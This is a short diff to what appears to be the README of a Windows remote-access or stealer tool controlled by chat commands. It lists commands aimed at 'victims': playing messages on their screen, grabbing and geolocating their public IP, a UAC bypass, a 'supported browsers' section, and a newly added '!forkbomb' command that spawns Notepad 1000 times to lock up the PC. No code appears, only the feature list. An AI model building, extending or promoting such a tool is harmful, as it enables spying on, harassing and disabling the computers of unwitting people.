@@ -23,6 +23,7 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 7. !tts message -- Plays a message on victims screen
 8. !ip -- Grab victims PUBLIC IP and geolocates it.
 9. **UAC BYPASS**
+10. !forkbomb ( SPAMS NOTEPAD 1000 TIMES, FORK BOMBING THE PC )
 
 
 # SUPPORTED BROWSERS 
